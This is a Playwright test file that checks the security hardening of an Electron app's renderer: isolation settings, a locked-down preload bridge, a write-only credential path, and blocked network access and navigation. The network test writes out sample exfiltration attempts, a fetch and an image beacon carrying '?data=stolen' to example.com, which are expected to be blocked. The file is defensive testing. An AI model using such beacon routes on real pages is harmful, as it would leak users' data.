import { expect, test } from '@playwright/test'
import { OPERATIONS } from '../../src/preload/operations.js'
import { launch, type LaunchedApp } from './app.js'

/**
 * What the renderer can reach, asserted in a running renderer (T156).
 *
 * Everything else about the bridge is checked by reading source or by unit
 * tests, and those are worth having — but they check what the code *says*.
 * `contextIsolation`, `sandbox` and `nodeIntegration` are settings whose effect
 * is a property of a live Chromium process, and the way they regress is not
 * someone editing the line that sets them: it is an Electron upgrade changing a
 * default, a `webPreferences` object getting spread over, or a second
 * `BrowserWindow` created somewhere that forgot them. None of that shows up in a
 * file this test could read.
 *
 * So this one asks the renderer itself.
 */

let it: LaunchedApp

test.beforeAll(async () => {
  it = await launch()
})

test.afterAll(async () => {
  await it.close()
})

test('the renderer holds no Node', async () => {
  const reachable = await it.window.evaluate(() =>
    [
      'require',
      'process',
      'module',
      'exports',
      'global',
      'Buffer',
      '__dirname',
      '__filename',
    ].filter((name) => (globalThis as Record<string, unknown>)[name] !== undefined),
  )

  // Any one of these is a renderer that can read the operator's keychain file,
  // spawn a process, or open the SQLite databases directly — from a page that
  // renders provider-supplied strings.
  expect(reachable).toEqual([])
})

/**
 * The settings themselves, not only their effect.
 *
 * Asserting "no Node in the page" is the right primary test, but it does not
 * catch `nodeIntegration` being switched on — because with `contextIsolation`
 * still true, Chromium keeps Node in the isolated world and the page stays
 * clean. Found by probing: flipping `nodeIntegration: true, sandbox: false` did
 * not fail this suite.
 *
 * That is not harmless. `contextIsolation` becomes the only thing standing
 * between a cross-site-scripted renderer and a process holding Node, and
 * isolation bypasses have existed. `sandbox: false` separately gives up the
 * OS-level sandbox. Both are worth failing a build over, so both are checked
 * directly.
 */
test('the window is created with all four hardening settings', async () => {
  const prefs = await it.app.evaluate(({ BrowserWindow }) => {
    const [window] = BrowserWindow.getAllWindows()
    // Cast because Playwright's view of the Electron API predates
    // `getLastWebPreferences`. It is present at runtime, which is what this
    // assertion is about — the *resolved* preferences the window was created
    // with, not the object that was passed in.
    const contents = window?.webContents as unknown as
      | { getLastWebPreferences(): Record<string, unknown> | null }
      | undefined

    return contents?.getLastWebPreferences() ?? null
  })

  expect(prefs).not.toBeNull()
  expect(prefs?.['contextIsolation']).toBe(true)
  expect(prefs?.['nodeIntegration']).toBeFalsy()
  expect(prefs?.['sandbox']).toBe(true)
  expect(prefs?.['webSecurity']).not.toBe(false)
})

test('the renderer holds no Electron', async () => {
  const reachable = await it.window.evaluate(() =>
    ['ipcRenderer', 'electron', 'webFrame', 'clipboard', 'shell'].filter(
      (name) => (globalThis as Record<string, unknown>)[name] !== undefined,
    ),
  )

  expect(reachable).toEqual([])
})

test('the bridge exposes exactly the enumerated operations', async () => {
  const surface = await it.window.evaluate(() => {
    const bridge = (globalThis as Record<string, unknown>)['grndctrl'] as Record<string, unknown>
    const operations: string[] = []
    const other: string[] = []

    for (const [key, value] of Object.entries(bridge)) {
      if (typeof value === 'object' && value !== null && key !== 'on') {
        for (const method of Object.keys(value as object)) operations.push(`${key}.${method}`)
      } else {
        other.push(key)
      }
    }

    return { operations: operations.sort(), other: other.sort() }
  })

  expect(surface.operations).toEqual([...OPERATIONS].sort())
  // `open` is the launcher, `credential` is the write-only path to the keychain,
  // `openLink` opens a link inside a ticket description, `copy` puts a recorded
  // prompt on the clipboard, and `on` is the push subscriptions. Nothing else
  // has any business being on the bridge, and a sixth member arriving here is
  // the thing this assertion exists to notice.
  //
  // `credential` is not an operation on purpose: the registry is served on the
  // loopback API and MCP too, so a secret in it would be kept off those surfaces
  // only by an `exposure` field staying correct forever. It is write-only —
  // asserted below, because "no way to read it back" is the property that makes
  // putting it here defensible.
  //
  // `openLink` is the only member that takes a URL from this side, and it is
  // defensible for the mirror-image reason: it also takes the ticket the URL is
  // supposed to be on, and main refuses any URL that ticket's own description
  // does not contain — checked against core's copy, not the page's. So the
  // capability being added here is "open a link the operator can already see",
  // not "open a URL".
  //
  // `copy` is the newest and takes the least: a prompt **id**, no string at all.
  // Main reads that prompt and copies what it read, so the page cannot choose
  // what the operator pastes next - the same discipline as `openLink`, one step
  // further, since there is no free-text argument to check in the first place.
  //
  // **Named exhaustively.** The obvious fix when this fails is `toContain`, and
  // it would then wave through every future addition as well, which is the
  // entire failure this file exists to catch.
  expect(surface.other).toEqual(['copy', 'credential', 'on', 'open', 'openLink'])
})

test('the credential path is write-only', async () => {
  const readers = await it.window.evaluate(() => {
    const bridge = (globalThis as Record<string, unknown>)['grndctrl'] as Record<string, unknown>
    return Object.keys(bridge).filter((name) => /^(get|read|list|fetch).*credential/i.test(name))
  })

  expect(readers).toEqual([])
})

test('there is no generic invoke, under any name', async () => {
  const suspicious = await it.window.evaluate(() => {
    const bridge = (globalThis as Record<string, unknown>)['grndctrl'] as Record<string, unknown>
    return ['invoke', 'send', 'call', 'dispatch', 'request', 'op'].filter(
      (name) => typeof bridge[name] === 'function',
    )
  })

  expect(suspicious).toEqual([])
})

test('an operation the registry does not have cannot be reached', async () => {
  // The guarantee is not that a handler refuses it. It is that there is no
  // method to call and no channel behind it, so the attempt fails in the
  // renderer before anything crosses the boundary.
  const result = await it.window.evaluate(() => {
    const bridge = (globalThis as Record<string, unknown>)['grndctrl'] as Record<string, unknown>
    const outbox = bridge['outbox'] as Record<string, unknown> | undefined
    return {
      hasNamespace: outbox !== undefined,
      hasFabricatedMethod: typeof outbox?.['enqueueDirectly'] === 'function',
    }
  })

  expect(result.hasNamespace).toBe(true)
  expect(result.hasFabricatedMethod).toBe(false)
})

test('the bridge cannot be replaced by the page', async () => {
  // `contextBridge` freezes what it exposes. Were it writable, a script that got
  // into the page could swap `grndctrl.notes.create` for its own function and
  // read every note the operator subsequently wrote.
  const outcome = await it.window.evaluate(() => {
    const before = (globalThis as Record<string, unknown>)['grndctrl']
    try {
      ;(globalThis as Record<string, unknown>)['grndctrl'] = { stolen: true }
    } catch {
      return 'threw'
    }
    return (globalThis as Record<string, unknown>)['grndctrl'] === before ? 'unchanged' : 'replaced'
  })

  expect(outcome).not.toBe('replaced')
})

test('the window renders through the bridge rather than around it', async () => {
  // The empty state is produced by a `projects.list` call over IPC. Seeing it
  // means the whole path ran: renderer, bridge, channel, registry, service,
  // SQLite, and back into React.
  await expect(it.window.getByRole('heading', { name: 'Ground Control' })).toBeVisible()
  await expect(it.window.getByText('No projects yet')).toBeVisible()
})

/**
 * The exfiltration routes, closed.
 *
 * This asserts the outcome rather than a mechanism, and two mechanisms produce
 * it: the CSP (`connect-src 'none'`, `img-src 'self' data:`) and the request
 * blocker in `security.ts`. Removing either one alone leaves this passing, and
 * that is what defence in depth means rather than a gap — the point of the
 * second one is the day the first is mis-delivered. The predicate behind the
 * blocker is unit-tested separately.
 */
test('nothing on the page can reach the network', async () => {
  const results = await it.window.evaluate(async () => {
    const fetched = await fetch('https://example.com/beacon')
      .then(() => 'allowed')
      .catch(() => 'blocked')

    const imaged = await new Promise<string>((resolve) => {
      const img = new Image()
      img.onload = () => resolve('allowed')
      img.onerror = () => resolve('blocked')
      // The classic route out of an injected script, and the one people forget
      // when they only think about `connect-src`.
      img.src = 'https://example.com/beacon.png?data=stolen'
      setTimeout(() => resolve('blocked'), 4000)
    })

    return { fetched, imaged }
  })

  expect(results).toEqual({ fetched: 'blocked', imaged: 'blocked' })
})

test('the page cannot navigate away from itself', async () => {
  const before = it.window.url()

  await it.window.evaluate(() => {
    try {
      ;(globalThis as unknown as { location: { href: string } }).location.href =
        'https://example.com'
    } catch {
      /* blocked before it started, which is also a pass */
    }
  })

  // `will-navigate` is refused in main/security.ts, and the request would be
  // cancelled by the load blocker even if it were not. Either way the window
  // stays where it is: every link opens in the operator's browser instead.
  await it.window.waitForTimeout(1000)
  expect(it.window.url()).toBe(before)
})
